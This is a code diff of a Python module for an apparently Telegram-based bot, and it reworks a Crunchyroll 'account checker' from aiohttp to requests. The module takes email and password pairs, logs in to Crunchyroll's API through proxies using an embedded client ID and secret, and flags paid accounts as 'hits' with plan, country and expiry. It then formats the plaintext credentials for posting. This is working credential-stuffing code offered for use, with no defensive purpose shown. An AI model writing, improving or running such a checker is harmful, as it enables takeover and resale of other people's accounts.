@@ -1,35 +1,28 @@
 """
 bot/modules/crunchyroll.py
 ~~~~~~~~~~~~~~~~~~~~~~~~~~
-Async Crunchyroll account checker using ``aiohttp``.
+Crunchyroll account checker using ``requests`` – exact logic from ``CR.py``.
 
-Ported from the original ``CR.py`` synchronous script.
+Each check runs in its own ``requests.Session`` (isolated cookies/state)
+and is dispatched via ``asyncio.to_thread()`` so the event loop stays free.
 """
 
 from __future__ import annotations
 
+import asyncio
 import uuid
 from datetime import datetime
 from typing import Optional
 
-import aiohttp
+import requests
 
 from bot.utils.logger import setup_logger
 
 log = setup_logger("mod.crunchyroll")
 
-# ── Public API constants (Crunchyroll mobile client) ────────────────────
+# ── API constants (from CR.py) ──────────────────────────────────────────
 _CLIENT_ID = "o7uowy7q4lgltbavyhjq"
 _CLIENT_SECRET = "lqrjETNx6W7uRnpcDm8wRVj8BChjC1er"
-_AUTH_URL = "https://beta-api.crunchyroll.com/auth/v1/token"
-_ACCOUNT_URL = "https://beta-api.crunchyroll.com/accounts/v1/me"
-_BENEFITS_URL = "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{guid}/benefits"
-_SUBS_URL = "https://beta-api.crunchyroll.com/subs/v4/accounts/{pid}/subscriptions"
-
-_HEADERS = {
-    "User-Agent": "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
-    "Content-Type": "application/x-www-form-urlencoded",
-}
 
 _COUNTRY_MAP = {
     "AF": "Afghanistan 🇦🇫", "AX": "Åland Islands 🇦🇽",
@@ -46,19 +39,26 @@ _COUNTRY_MAP = {
 }
 
 
-async def check_account(
+# ── Synchronous check (mirrors CR.py exactly) ──────────────────────────
+
+def _check_sync(
     email: str,
     password: str,
-    session: aiohttp.ClientSession,
-    proxy: Optional[str] = None,
+    proxy: Optional[dict[str, str]] = None,
 ) -> Optional[dict]:
-    """Check a single Crunchyroll account.
+    """Check a single Crunchyroll account using ``requests.Session``.
 
-    Returns a dict with hit details on success, or ``None`` on
-    failure / free account / bad credentials.
+    Returns a dict with hit details, a dict with ``free=True`` for free
+    accounts, or ``None`` for bad credentials / errors.
     """
+    session = requests.Session()
+    headers = {
+        "User-Agent": "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
+        "Content-Type": "application/x-www-form-urlencoded",
+    }
+
     try:
-        # 1. Authenticate
+        # 1. AUTHENTICATION
         data = {
             "grant_type": "password",
             "username": email,
@@ -70,96 +70,99 @@ async def check_account(
             "device_id": str(uuid.uuid4()),
             "device_name": "Goku",
         }
-        async with session.post(
-            _AUTH_URL, data=data, headers=_HEADERS, proxy=proxy, timeout=aiohttp.ClientTimeout(total=15)
-        ) as r1:
-            if r1.status != 200:
-                log.debug("CR auth failed for %s: HTTP %s", email, r1.status)
-                return None
-            auth = await r1.json(content_type=None)
+        r1 = session.post(
+            "https://beta-api.crunchyroll.com/auth/v1/token",
+            data=data, headers=headers, proxies=proxy, timeout=10,
+        )
 
-        token = auth.get("access_token")
-        pid = auth.get("profile_id")
-        if not token:
+        if r1.status_code != 200:
             return None
 
-        auth_headers = {**_HEADERS, "Authorization": f"Bearer {token}"}
+        auth = r1.json()
+        token = auth["access_token"]
+        pid = auth["profile_id"]
+        headers["Authorization"] = f"Bearer {token}"
 
-        # 2. Account details
-        async with session.get(
-            _ACCOUNT_URL, headers=auth_headers, proxy=proxy,
-            timeout=aiohttp.ClientTimeout(total=10),
-        ) as r2:
-            acc = await r2.json(content_type=None)
+        # 2. ACCOUNT DETAILS
+        r2 = session.get(
+            "https://beta-api.crunchyroll.com/accounts/v1/me",
+            headers=headers, proxies=proxy, timeout=7,
+        ).json()
+        ev = r2.get("email_verified", False)
+        guid = r2.get("external_id")
 
-        email_verified = acc.get("email_verified", False)
-        guid = acc.get("external_id")
-        if not guid:
-            return None
+        # 3. PLAN & COUNTRY
+        r3 = session.get(
+            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{guid}/benefits",
+            headers=headers, proxies=proxy, timeout=7,
+        ).json()
 
-        # 3. Subscription / benefits
-        async with session.get(
-            _BENEFITS_URL.format(guid=guid), headers=auth_headers,
-            proxy=proxy, timeout=aiohttp.ClientTimeout(total=10),
-        ) as r3:
-            benefits = await r3.json(content_type=None)
+        if r3.get("total", 0) > 0:
+            country_code = r3.get("subscription_country", "Unknown")
+            country_full = _COUNTRY_MAP.get(country_code, country_code)
 
-        if benefits.get("total", 0) == 0:
+            raw_benefit = str(r3.get("items", []))
+            if "streams.4" in raw_benefit:
+                plan = "MEGA FAN MEMBER"
+            elif "streams.6" in raw_benefit:
+                plan = "ULTIMATE FAN MEMBER"
+            elif "streams.1" in raw_benefit:
+                plan = "FAN MEMBER"
+            else:
+                plan = "Premium"
+
+            # 4. EXPIRY
+            r4 = session.get(
+                f"https://beta-api.crunchyroll.com/subs/v4/accounts/{pid}/subscriptions",
+                headers=headers, proxies=proxy, timeout=7,
+            ).json()
+
+            expiry = "N/A"
+            remaining = "0"
+            if "nextRenewalDate" in str(r4):
+                for s in r4.get("subscriptions", []):
+                    if s.get("nextRenewalDate"):
+                        expiry = s["nextRenewalDate"].split("T")[0]
+                        try:
+                            d1 = datetime.strptime(expiry, "%Y-%m-%d")
+                            remaining = str((d1 - datetime.now()).days)
+                        except ValueError:
+                            pass
+                        break
+
+            return {
+                "email": email,
+                "password": password,
+                "email_verified": ev,
+                "plan": plan,
+                "expiry": expiry,
+                "remaining_days": remaining,
+                "country": country_full,
+            }
+        else:
+            # Valid login but no subscription → free account.
             return {"email": email, "password": password, "free": True}
 
-        country_code = benefits.get("subscription_country", "Unknown")
-        country_full = _COUNTRY_MAP.get(country_code, country_code)
-
-        raw_benefit = str(benefits.get("items", []))
-        if "streams.6" in raw_benefit:
-            plan = "ULTIMATE FAN"
-        elif "streams.4" in raw_benefit:
-            plan = "MEGA FAN"
-        elif "streams.1" in raw_benefit:
-            plan = "FAN"
-        else:
-            plan = "Premium"
-
-        # 4. Expiry / renewal date
-        expiry = "N/A"
-        remaining = "0"
-        async with session.get(
-            _SUBS_URL.format(pid=pid), headers=auth_headers,
-            proxy=proxy, timeout=aiohttp.ClientTimeout(total=10),
-        ) as r4:
-            subs_data = await r4.json(content_type=None)
-
-        for sub in subs_data.get("subscriptions", []):
-            nrd = sub.get("nextRenewalDate")
-            if nrd:
-                expiry = nrd.split("T")[0]
-                try:
-                    exp_dt = datetime.strptime(expiry, "%Y-%m-%d")
-                    remaining = str((exp_dt - datetime.now()).days)
-                except ValueError:
-                    pass
-                break
-
-        return {
-            "email": email,
-            "password": password,
-            "email_verified": email_verified,
-            "plan": plan,
-            "expiry": expiry,
-            "remaining_days": remaining,
-            "country": country_full,
-        }
-
-    except (
-        aiohttp.ClientError, TimeoutError,
-        KeyError, TypeError, ValueError, IndexError, AttributeError,
-    ) as exc:
+    except Exception as exc:
         log.debug("CR check failed for %s: %s", email, exc)
         return None
 
 
+# ── Async wrapper ───────────────────────────────────────────────────────
+
+async def check_account(
+    email: str,
+    password: str,
+    proxy: Optional[dict[str, str]] = None,
+) -> Optional[dict]:
+    """Async wrapper — runs the synchronous check in a thread."""
+    return await asyncio.to_thread(_check_sync, email, password, proxy)
+
+
+# ── Formatting helpers ──────────────────────────────────────────────────
+
 def format_hit(hit: dict) -> str:
-    """Format a hit dictionary into a user-friendly string."""
+    """Format a hit dictionary into a user-friendly Telegram string."""
     return (
         f"🍥 **Crunchyroll Hit**\n"
         f"┣ **Email:** `{hit['email']}`\n"
